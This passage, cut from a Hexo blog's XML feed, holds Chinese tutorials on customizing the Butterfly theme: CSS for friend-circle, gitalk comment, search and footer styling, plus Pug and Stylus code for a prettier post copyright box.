class="selector-id">#fMessageBoard</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">280px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.fActiveFriend</span><span class="selector-class">.fItem</span>&#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.fArticleNum</span><span class="selector-class">.fItem</span>&#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-id">#rankByCreated</span>&#123;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-id">#rankByUpdated</span>&#123;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/* 修改朋友圈夜间模式 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#fMessageBoard</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">0.5</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#eeeeee</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">280px</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.5</span>) <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">0px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.fMessageItem</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">222</span>, <span class="number">221</span>, <span class="number">174</span>, <span class="number">0.5</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">5px</span> <span class="number">0px</span> inset <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.fActiveFriend</span><span class="selector-class">.fItem</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.fErrorSite</span><span class="selector-class">.fItem</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.fArticleNum</span><span class="selector-class">.fItem</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">span</span><span class="selector-id">#rankByCreated</span>&#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">span</span><span class="selector-id">#rankByUpdated</span>&#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.fArticleItem</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#eeeeee</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.5</span>) <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.fArticleItem</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.5</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">2px</span> <span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">a</span><span class="selector-class">.fArticleTitle</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#eeeeee</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#fcircleMoreBtn</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#eeeeee</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.5</span>) <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">0px</span>  <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#fcircleMoreBtn</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">102</span>, <span class="number">218</span>, <span class="number">215</span>, <span class="number">0.5</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">2px</span> <span class="number">0px</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="7-修改gitalk评论样式"><a href="#7-修改gitalk评论样式" class="headerlink" title="7.修改gitalk评论样式"></a>7.修改gitalk评论样式</h1><p>修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/* 评论白天模式背景设置 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.gt-comment-body</span><span class="selector-class">.markdown-body</span>&#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&#x27;tzy&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.gt-comment-content</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">17</span>, <span class="number">104</span>, <span class="number">235</span>, <span class="number">0.8</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.gt-comment</span><span class="selector-class">.gt-comment-admin</span> <span class="selector-class">.gt-comment-content</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">17</span>, <span class="number">104</span>, <span class="number">235</span>, <span class="number">0.8</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.gt-comment-content</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">170</span>, <span class="number">170</span>, <span class="number">170</span>, <span class="number">0.8</span>) <span class="number">2px</span> <span class="number">2px</span> <span class="number">10px</span> <span class="number">0px</span>  <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/* 评论夜间模式背景设置 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.gt-comment-body</span><span class="selector-class">.markdown-body</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;tzy&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.gt-comment-content</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">17</span>, <span class="number">104</span>, <span class="number">235</span>, <span class="number">0.8</span>);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.gt-comment</span><span class="selector-class">.gt-comment-admin</span> <span class="selector-class">.gt-comment-content</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">17</span>, <span class="number">104</span>, <span class="number">235</span>, <span class="number">0.8</span>);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.gt-comment-content</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">139</span>, <span class="number">182</span>, <span class="number">247</span>, <span class="number">0.8</span>) <span class="number">2px</span> <span class="number">2px</span> <span class="number">10px</span> <span class="number">0px</span>  <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="8-修改本地搜索样式"><a href="#8-修改本地搜索样式" class="headerlink" title="8.修改本地搜索样式"></a>8.修改本地搜索样式</h1><p>修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/* 修改本地搜索样式 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#local-search</span> <span class="selector-class">.search-dialog</span>&#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">20</span>, <span class="number">20</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#98d3d3</span>70;</span><br><span class="line">  <span class="comment">/* box-shadow: 5px 5px 5px #a0a0a0; */</span></span><br><span class="line">  <span class="comment">/*底色*/</span></span><br><span class="line">  <span class="attribute">background-color</span>:<span class="number">#ffffff</span>aa;</span><br><span class="line">  <span class="comment">/*chrome2+,safari4+;multiplecolorstops*/</span></span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">-webkit-gradient</span>(linear,leftbottom,righttop,<span class="built_in">color-stop</span>(<span class="number">0.32</span>,<span class="number">#ce1ef1</span>70),<span class="built_in">color-stop</span>(<span class="number">0.66</span>,<span class="number">#0fe9e9</span>70),<span class="built_in">color-stop</span>(<span class="number">0.83</span>,<span class="number">#3e76aa</span>70));</span><br><span class="line">  <span class="comment">/*chrome10+,safari5.1+*/</span></span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">-webkit-linear-gradient</span>(<span class="number">45deg</span>,<span class="number">#ce1ef1</span>70,<span class="number">#0fe9e9</span>70,<span class="number">#3e76aa</span>70);</span><br><span class="line">  <span class="comment">/*firefox;multiplecolorstops*/</span></span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">-moz-linear-gradient</span>(<span class="number">45deg</span>,<span class="number">#ce1ef1</span>70,<span class="number">#0fe9e9</span>70,<span class="number">#3e76aa</span>70);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.search-result-title</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">a</span><span class="selector-class">.search-result-title</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">37</span>, <span class="number">37</span>, <span class="number">37</span>) <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.local-search__hit-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">230</span>, <span class="number">84</span>, <span class="number">17</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.search-keyword</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">230</span>, <span class="number">17</span>, <span class="number">45</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.search-result</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">17px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.search-dialog__title</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">230</span>, <span class="number">17</span>, <span class="number">45</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.search-dialog</span> <span class="selector-tag">span</span><span class="selector-class">.search-close-button</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f84040</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="9-页脚蝴蝶振翅动画"><a href="#9-页脚蝴蝶振翅动画" class="headerlink" title="9.页脚蝴蝶振翅动画"></a>9.页脚蝴蝶振翅动画</h1><p>修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 页脚蝴蝶振翅动画 */</span></span><br><span class="line"><span class="selector-class">.copyright</span> svg&#123;</span><br><span class="line">  <span class="attribute">animation</span>:butterfly <span class="number">1s</span> linear infinite alternate;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> butterfly &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">rotateY</span>(<span class="number">70deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">rotateY</span>(<span class="number">0deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-修改iconfont样式"><a href="#10-修改iconfont样式" class="headerlink" title="10.修改iconfont样式"></a>10.修改iconfont样式</h1><p>修改<strong><code>[Blogroot]\themes\butterfly\source\css\custom.css</code></strong>，新增如下样式：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*iconfont默认样式*/</span></span><br><span class="line"><span class="selector-class">.icon</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1em</span>; <span class="attribute">height</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: -<span class="number">0.15em</span>;</span><br><span class="line">  fill: currentColor;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>未完。待续~~~</p><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>版权声明美化</title>
      <link href="2021/10/12/%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E7%BE%8E%E5%8C%96/"/>
      <url>2021/10/12/%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>版权声明美化</p><p class='p center small'>Butterfly主题魔改教程，实现版权声明美化。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/8322f8e6/">Akilarの糖果屋的《（二创）Copyright-beautify》</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>本篇教程是转载<a href="https://akilar.top/posts/8322f8e6/">Akilarの糖果屋的《（二创）Copyright-beautify》</a>的教程贴，记录博客魔改历程，方便以后升级找到回家的路。</p><h1 id="2-魔改步骤"><a href="#2-魔改步骤" class="headerlink" title="2.魔改步骤"></a>2.魔改步骤</h1><ol><li><p>修改 <code>[Blogroot]\themes\butterfly\layout\includes\post\post-copyright.pug</code>, 直接复制以下内容替换原文件内容。此处多次用到了三元运算符作为默认项设置，在确保有主题配置文件的默认项的情况下，也可以在相应文章的 <code>front-matter</code> 中重新定义作者，原文链接，开源许可协议等内容。</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if theme.post_copyright.enable &amp;&amp; page.copyright !== false</span><br><span class="line">  - let author = page.copyright_author ? page.copyright_author : config.author</span><br><span class="line">  - let url = page.copyright_url ? page.copyright_url : page.permalink</span><br><span class="line">  - let license = page.license ? page.license : theme.post_copyright.license</span><br><span class="line">  - let license_url = page.license_url ? page.license_url : theme.post_copyright.license_url</span><br><span class="line">  .post-copyright</span><br><span class="line">    .post-copyright__title</span><br><span class="line">      span.post-copyright-info</span><br><span class="line">        h #[=page.title]</span><br><span class="line">    .post-copyright__type</span><br><span class="line">      span.post-copyright-info</span><br><span class="line">        a(href=url_for(url))= theme.post_copyright.decode ? decodeURI(url) : url</span><br><span class="line">    .post-copyright-m</span><br><span class="line">      .post-copyright-m-info</span><br><span class="line">        .post-copyright-a</span><br><span class="line">            h 作者</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                h=author</span><br><span class="line">        .post-copyright-c</span><br><span class="line">            h 发布于</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                h=date(page.date, config.date_format)</span><br><span class="line">        .post-copyright-u</span><br><span class="line">            h 更新于</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                h=date(page.updated, config.date_format)</span><br><span class="line">        .post-copyright-c</span><br><span class="line">            h 许可协议</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                a.icon(rel=&#x27;noopener&#x27; target=&#x27;_blank&#x27; title=&#x27;Creative Commons&#x27; href=&#x27;https://creativecommons.org/&#x27;)</span><br><span class="line">                  i.fab.fa-creative-commons</span><br><span class="line">                a(rel=&#x27;noopener&#x27; target=&#x27;_blank&#x27; title=license href=url_for(license_url))=license</span><br></pre></td></tr></table></figure></li><li><p>修改 <code>[Blogroot]\themes\butterfly\source\css\_layout\post.styl</code>, 直接复制以下内容，替换原文件。</p> <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beautify</span><span class="params">()</span></span></span><br><span class="line">  headStyle(fontsize)</span><br><span class="line">    padding-left: unit(fontsize + .4, &#x27;rem&#x27;)</span><br><span class="line"></span><br><span class="line">    code</span><br><span class="line">      <span class="attribute">font-size</span>: unit(fontsize, <span class="string">&#x27;rem&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    &amp;:before</span><br><span class="line">      margin-left: unit((-(fontsize + .2)), &#x27;rem&#x27;)</span><br><span class="line">      <span class="attribute">font-size</span>: unit(fontsize, <span class="string">&#x27;rem&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    &amp;:hover</span><br><span class="line">      padding-left: unit(fontsize + .6, &#x27;rem&#x27;)</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">h1</span>,</span><br><span class="line">  <span class="selector-tag">h2</span>,</span><br><span class="line">  <span class="selector-tag">h3</span>,</span><br><span class="line">  <span class="selector-tag">h4</span>,</span><br><span class="line">  <span class="selector-tag">h5</span>,</span><br><span class="line">  h6</span><br><span class="line">    transition: all .2s ease-out</span><br><span class="line"></span><br><span class="line">    &amp;:before</span><br><span class="line">      <span class="attribute">position</span>: absolute</span><br><span class="line">      top: calc(50% - .35rem)</span><br><span class="line">      <span class="attribute">color</span>: <span class="variable">$title</span>-prefix-icon-color</span><br><span class="line">      <span class="attribute">content</span>: <span class="variable">$title</span>-prefix-icon</span><br><span class="line">      <span class="attribute">line-height</span>: <span class="number">1</span></span><br><span class="line">      transition: all .2s ease-out</span><br><span class="line">      <span class="keyword">@extend</span> .fontawesomeIcon</span><br><span class="line"></span><br><span class="line">    &amp;:hover</span><br><span class="line">      &amp;:before</span><br><span class="line">        <span class="attribute">color</span>: <span class="variable">$light</span>-blue</span><br><span class="line"></span><br><span class="line">  h1</span><br><span class="line">    headStyle(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  h2</span><br><span class="line">    headStyle(.<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">  h3</span><br><span class="line">    headStyle(.<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  h4</span><br><span class="line">    headStyle(.<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">  h5</span><br><span class="line">    headStyle(.<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">  h6</span><br><span class="line">    headStyle(.<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">ol</span>,</span><br><span class="line">  ul</span><br><span class="line">    margin-top: .4rem</span><br><span class="line">    padding: 0 0 0 .8rem</span><br><span class="line">    <span class="attribute">list-style</span>: none</span><br><span class="line">    <span class="attribute">counter-reset</span>: li</span><br><span class="line"></span><br><span class="line">    +maxWidth768()</span><br><span class="line">      padding: 0 0 0 .4rem</span><br><span class="line"></span><br><span class="line">    p</span><br><span class="line">      margin: 0 0 .5rem</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">ol</span>,</span><br><span class="line">    ul</span><br><span class="line">      padding-left: .6rem</span><br><span class="line"></span><br><span class="line">      +maxWidth768()</span><br><span class="line">        padding-left: .2rem</span><br><span class="line"></span><br><span class="line">    li</span><br><span class="line">      <span class="selector-pseudo">&amp;:not</span>(.tab)</span><br><span class="line">        <span class="attribute">position</span>: relative</span><br><span class="line">        margin: .2rem 0</span><br><span class="line"></span><br><span class="line">      &amp;:hover</span><br><span class="line">        &amp;:before</span><br><span class="line">          <span class="attribute">transform</span>: rotate(<span class="number">360deg</span>)</span><br><span class="line"></span><br><span class="line">      &amp;:before</span><br><span class="line">        <span class="attribute">position</span>: absolute</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span></span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span></span><br><span class="line">        <span class="attribute">background</span>: <span class="variable">$light</span>-blue</span><br><span class="line">        <span class="attribute">color</span>: <span class="variable">$white</span></span><br><span class="line">        <span class="attribute">cursor</span>: pointer</span><br><span class="line">        transition: all .3s ease-out</span><br><span class="line"></span><br><span class="line">  ol</span><br><span class="line">    &gt; li</span><br><span class="line">      <span class="selector-pseudo">&amp;:not</span>(.tab)</span><br><span class="line">        padding: .2em .2em .2em 1.8em</span><br><span class="line"></span><br><span class="line">      &amp;:before</span><br><span class="line">        margin-top: .65em</span><br><span class="line">        <span class="attribute">width</span>: w = <span class="number">1.45em</span></span><br><span class="line">        <span class="attribute">height</span>: h = w</span><br><span class="line">        border-radius: .5 * w</span><br><span class="line">        <span class="attribute">content</span>: counter(li)</span><br><span class="line">        <span class="attribute">counter-increment</span>: li</span><br><span class="line">        <span class="attribute">text-align</span>: center</span><br><span class="line">        font-size: .85em</span><br><span class="line">        <span class="attribute">line-height</span>: h</span><br><span class="line"></span><br><span class="line">  ul</span><br><span class="line">    &gt; <span class="selector-tag">li</span><span class="selector-pseudo">:not</span>(.tab)</span><br><span class="line">      padding: .2em .2em .2em 1.4em</span><br><span class="line"></span><br><span class="line">      &amp;:hover</span><br><span class="line">        &amp;:before</span><br><span class="line">          <span class="attribute">border-color</span>: <span class="variable">$pseudo</span>-hover</span><br><span class="line"></span><br><span class="line">      &amp;:before</span><br><span class="line">        <span class="variable">$w</span> = .<span class="number">42em</span></span><br><span class="line">        top: .78em</span><br><span class="line">        <span class="attribute">width</span>: w = <span class="variable">$w</span></span><br><span class="line">        <span class="attribute">height</span>: h = w</span><br><span class="line">        border: .5 * w solid $light-blue</span><br><span class="line">        <span class="attribute">border-radius</span>: w</span><br><span class="line">        <span class="attribute">background</span>: transparent</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="attribute">line-height</span>: h</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">no-beautify</span><span class="params">()</span></span></span><br><span class="line">  <span class="selector-tag">ol</span>,</span><br><span class="line">  ul</span><br><span class="line">    margin-top: .4rem</span><br><span class="line"></span><br><span class="line">    p</span><br><span class="line">      margin: 0 0 .5rem</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">ol</span>,</span><br><span class="line">    ul</span><br><span class="line">      padding-left: .5rem</span><br><span class="line"></span><br><span class="line">    li</span><br><span class="line">      <span class="attribute">position</span>: relative</span><br><span class="line">      margin: .3rem 0</span><br><span class="line">      padding-left: .3rem</span><br><span class="line"></span><br><span class="line">#article-container</span><br><span class="line">  <span class="attribute">word-wrap</span>: break-word</span><br><span class="line">  <span class="attribute">overflow-wrap</span>: break-word</span><br><span class="line"></span><br><span class="line">  a</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$theme</span>-link-color</span><br><span class="line"></span><br><span class="line">    &amp;:hover</span><br><span class="line">      <span class="attribute">text-decoration</span>: underline</span><br><span class="line"></span><br><span class="line">  img</span><br><span class="line">    <span class="attribute">display</span>: block</span><br><span class="line">    margin: 0 auto .8rem</span><br><span class="line"></span><br><span class="line">  p</span><br><span class="line">    margin: 0 0 .8rem</span><br><span class="line"></span><br><span class="line">  iframe</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">1rem</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> hexo-config(<span class="string">&#x27;beautify.enable&#x27;</span>) &amp;&amp; hexo-config(<span class="string">&#x27;beautify.field&#x27;</span>) == <span 